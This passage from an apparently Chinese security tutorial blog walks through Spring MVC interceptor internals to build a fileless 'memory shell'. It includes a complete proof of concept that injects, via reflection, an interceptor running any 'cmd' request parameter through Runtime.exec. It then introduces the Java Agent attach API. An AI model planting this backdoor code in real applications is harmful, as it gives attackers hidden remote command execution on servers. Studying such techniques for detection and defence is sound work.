class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shell.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spring_Controller</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Login</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Success!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>interceptor</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shell.interceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spring_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="comment">//如果请求路径为/login则放行</span></span><br><span class="line">        <span class="keyword">if</span> ( url.indexOf(<span class="string">&quot;/login&quot;</span>) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            writer.write(<span class="string">&quot;LoginIn&quot;</span>);</span><br><span class="line">            writer.flush();</span><br><span class="line">            writer.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        writer.write(<span class="string">&quot;LoginInFirst&quot;</span>);</span><br><span class="line">        writer.flush();</span><br><span class="line">        writer.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>在springmvc.xml配置文件中配置相应的Interceptor</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/*&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.shell.interceptor.Spring_Interceptor&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230811224051963.png" alt="image-20230811224051963"></p><p>接下来分析这么调用到这个<code>preHandle</code>的</p><h4 id="request调用流程"><a href="#request调用流程" class="headerlink" title="request调用流程"></a>request调用流程</h4><p>在ApplicationFilterChain#internalDoFilter处下一个断点，可以看到此时的调用栈是和启动Tomcat时相同的</p><p><img src="../images/image-20230811225132955.png" alt="image-20230811225132955"></p><p>这里其实会循环在<code>internalDoFilter</code>和<code>doFilter</code>之间来回调用 可能我选的是第一个internalDoFilter  导致现在只看到一个</p><p>但与Tomcat不同的是，当调用到<code>HttpServlet#service</code>时，最终会调用<code>DispatcherServlet#doDispatch</code>进行逻辑处理，这正是Spring的逻辑处理核心类。</p><p><img src="../images/image-20230811225550782.png" alt="image-20230811225550782"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">doDispatch:1028, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:963, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:1006, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:898, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:655, HttpServlet (javax.servlet.http)</span><br><span class="line">service:883, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:764, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:162, ApplicationFilterChain (org.apache.catalina.core)</span><br></pre></td></tr></table></figure><p>跟进到<code>getHandler</code>方法</p><p><img src="../images/image-20230814145912527.png" alt="image-20230814145912527"></p><p>在 <code>getHandler</code> 方法中，会通过遍历 <code>this.handlerMappings</code> 来获取 <code>HandlerMapping</code> 对象实例 <code>mapping</code></p><p>(<img src="../images/image-20230814153013853.png" alt="image-20230814153013853">)</p><p>这个<code>mapping</code>正好是<code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> 类，如何调用到getHandler方法</p><p>并通过 <code>getHandlerExecutionChain(handler, request)</code> 方法返回 <code>HandlerExecutionChain</code> 类的实例</p><p><img src="../images/image-20230814152525139.png" alt="image-20230814152525139"></p><p>跟进<code>AbstractHandlerMapping</code>#<code>getHandlerExecutionChain</code></p><p><img src="../images/image-20230814153104142.png" alt="image-20230814153104142"></p><p>可以看到其通过<code>adaptedInterceptors</code>获取所有Interceptor后进行遍历，其中可以看见一个我们自己定义的Interceptor</p><p>然后通过<code>chain.addInterceptor()</code>将所有Interceptor添加到<code>HandlerExecutionChain</code>中。<strong>最后返回到<code>DispatcherServlet#doDispatch()</code>中</strong>，调用<code>mappedHandler.applyPreHandle</code>方法</p><p><img src="../images/image-20230814153745665.png" alt="image-20230814153745665"></p><p><img src="../images/image-20230814153802029.png" alt="image-20230814153802029"></p><p>然后遍历调用Interceptor中的<code>preHandle()</code>拦截方法。</p><p>因此当一个Request发送到Spring应用时，大致会经过如下几个层面才会进入Controller层</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HttpRequest --&gt; Filter --&gt; DispactherServlet --&gt; Interceptor --&gt; Controller</span><br></pre></td></tr></table></figure><p>前面大量的分析主要都是分析在<code>DispactherServlet</code>在如何获取<code>Interceptor</code>的过程中</p><h4 id="Interceptor型内存马实现过程"><a href="#Interceptor型内存马实现过程" class="headerlink" title="Interceptor型内存马实现过程"></a>Interceptor型内存马实现过程</h4><p>通过以上分析，Interceptor实际上是可以拦截所有想到达Controller的请求的。下面的问题就是如何动态地注册一个恶意的Interceptor了。由于Interceptor和Filter有一定的相似之处，因此我们可以仿照Filter型内存马的实现思路</p><ul><li>获取当前运行环境的上下文</li><li>实现恶意Interceptor</li><li>注入恶意Interceptor</li></ul><h5 id="获取环境上下文"><a href="#获取环境上下文" class="headerlink" title="获取环境上下文"></a>获取环境上下文</h5><p>在Controller型内存马中，给出了四种获取Spring上下文<code>ApplicationContext</code>的方法。下面我们还可以通过反射获取<code>LiveBeansView</code>类的<code>applicationContexts</code> 属性来获取上下文。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span></span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line"><span class="comment">// 2. 属性被 private 修饰，所以 setAccessible true</span></span><br><span class="line">filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 3. 获取一个 ApplicationContext 实例</span></span><br><span class="line">org.springframework.web.context.<span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="literal">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure><p><code>org.springframework.context.support.LiveBeansView</code> 类在 <code>spring-context</code> <strong>3.2.x</strong> 版本（现在最新版本是 <strong>5.3.x</strong>）才加入其中，所以比较低版本的 spring 无法通过此方法获得 <code>ApplicationContext</code> 的实例。</p><h5 id="获取adaptedInterceptors属性值"><a href="#获取adaptedInterceptors属性值" class="headerlink" title="获取adaptedInterceptors属性值"></a>获取adaptedInterceptors属性值</h5><p>获得 <code>ApplicationContext</code> 实例后，还需要知道 <code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> 类实例的 bean name 叫什么。</p><p><img src="../images/image-20230814155326510.png" alt="image-20230814155326510"></p><p>在这类里面给<code>adaptedInterceptors</code>赋值 </p><p>我们可以通过<code>ApplicationContext</code>上下文来获取<code>AbstractHandlerMapping</code>，进而反射获取<code>adaptedInterceptors</code>属性值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.web.servlet.handler.<span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="string">&quot;requestMappingHandlerMapping&quot;</span>);</span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br></pre></td></tr></table></figure><h5 id="实现恶意Interceptor"><a href="#实现恶意Interceptor" class="headerlink" title="实现恶意Interceptor"></a>实现恶意Interceptor</h5><p>这里选择继承HandlerInterceptor接口，并重写其preHandle方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shell.interceptor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="动态注册Interceptor"><a href="#动态注册Interceptor" class="headerlink" title="动态注册Interceptor"></a>动态注册Interceptor</h5><p>我们知道Spring是通过遍历adaptedInterceptors属性值来执行Interceptor的，因此最后我们只需要将恶意Interceptor加入到 <code>adaptedInterceptors</code> 属性值中就可以了。</p><p><strong>(这里能使用这个<code>add()</code>的原因是这个<code>adaptedInterceptors</code>是这个List类型  所以可以使用add())</strong></p><p><img src="../images/image-20230814162445148.png" alt="image-20230814162445148"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将恶意Interceptor添加入adaptedInterceptors</span></span><br><span class="line"><span class="type">Shell_Interceptor</span> <span class="variable">shell_interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Interceptor</span>();</span><br><span class="line">adaptedInterceptors.add(shell_interceptor);</span><br></pre></td></tr></table></figure><h5 id="完整POC-5"><a href="#完整POC-5" class="headerlink" title="完整POC"></a>完整POC</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shell.controller;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Shell_Interceptor_Controller</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Inject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//获取上下文环境</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//获取adaptedInterceptors属性值</span></span><br><span class="line">        org.springframework.web.servlet.handler.<span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">//将恶意Interceptor添加入adaptedInterceptors</span></span><br><span class="line">        <span class="type">Shell_Interceptor</span> <span class="variable">shell_interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Interceptor</span>();</span><br><span class="line">        adaptedInterceptors.add(shell_interceptor);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230814165426691.png" alt="image-20230814165426691"></p><p><img src="../images/image-20230814165518672.png" alt="image-20230814165518672"></p><p>成功弹出计算器</p><h2 id="Java-Agent内存马"><a href="#Java-Agent内存马" class="headerlink" title="Java Agent内存马"></a>Java Agent内存马</h2><h3 id="Jvav-Agent是什么"><a href="#Jvav-Agent是什么" class="headerlink" title="Jvav_Agent是什么"></a>Jvav_Agent是什么</h3><p>我们知道Java是一种静态强类型语言，在运行之前必须将其编译成<code>.class</code>字节码，然后再交给JVM处理运行。Java Agent就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。</p><p>实际上，平时较为常见的技术如热部署、一些诊断工具等都是基于Java Agent技术来实现的。那么Java Agent技术具体是怎样实现的呢？</p><p>对于Agent（代理）来讲，其大致可以分为两种，一种是在JVM启动前加载的<code>premain-Agent</code>，另一种是JVM启动之后加载的<code>agentmain-Agent</code>。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图</p><p><img src="../images/image-20230816144454646.png" alt="image-20230816144454646"></p><h3 id="Java-Agent示例"><a href="#Java-Agent示例" class="headerlink" title="Java_Agent示例"></a>Java_Agent示例</h3><h4 id="premain-Agent"><a href="#premain-Agent" class="headerlink" title="premain-Agent"></a>premain-Agent</h4><p>我们首先来实现一个简单的<code>premain-Agent</code>，创建一个Maven项目，编写一个简单的premain-Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.premain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_premain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span> ; i&lt;<span class="number">10</span> ; i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用了premain-Agent！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着在<code>resource/META-INF/</code>下创建<code>MANIFEST.MF</code>清单文件用以指定<code>premain-Agent</code>的启动类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Premain-Class: com.java.premain.agent.Java_Agent_premain</span><br></pre></td></tr></table></figure><p>将其打包成jar文件</p><p><img src="../images/image-20230816151943665.png" alt="image-20230816151943665"></p><p>创建一个目标类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加JVM Options（注意冒号之后不能有空格）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:<span class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span></span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="../images/image-20230816151837614.png" alt="image-20230816151837614"></p><h4 id="agentmain-Agent"><a href="#agentmain-Agent" class="headerlink" title="agentmain-Agent"></a>agentmain-Agent</h4><p>相较于premain-Agent只能在JVM启动前加载，agentmain-Agent能够在JVM启动之后加载并实现相应的修改字节码功能。下面我们来了解一下和JVM有关的两个类。</p><p><strong>(重新建一个项目来执行这个)</strong></p><h5 id="VirtualMachine类"><a href="#VirtualMachine类" class="headerlink" title="VirtualMachine类"></a>VirtualMachine类</h5><p><code>com.sun.tools.attach.VirtualMachine</code>类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p><p>该类允许我们通过给attach方法传入一个JVM的PID，来远程连接到该JVM上 ，之后我们就可以对连接的JVM进行各种操作，如注入Agent。下面是该类的主要方法</p><p>(<strong>这个就是java在运行之前会编译成class文件  然后并且交给JVM运行 并且这个是一个独立的进程</strong>)        一个独立的进程对应一个独立的JVM</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//允许我们传入一个JVM的PID，然后远程连接到该JVM上</span></span><br><span class="line">VirtualMachine.attach()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</span></span><br><span class="line">VirtualMachine.loadAgent()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//获得当前所有的JVM列表</span></span><br><span class="line">VirtualMachine.list()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//解除与特定JVM的连接</span></span><br><span class="line">VirtualMachine.detach()</span><br></pre></td></tr></table></figure><h5 id="VirtualMachineDescriptor类"><a href="#VirtualMachineDescriptor类" class="headerlink" title="VirtualMachineDescriptor类"></a>VirtualMachineDescriptor类</h5><p><code>com.sun.tools.attach.VirtualMachineDescriptor</code>类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">get_PID</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;get_PID&quot;</span>))</span><br><span class="line">            System.out.println(vmd.id());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">##</span><br><span class="line"><span class="number">4908</span></span><br><span class="line"> </span><br><span 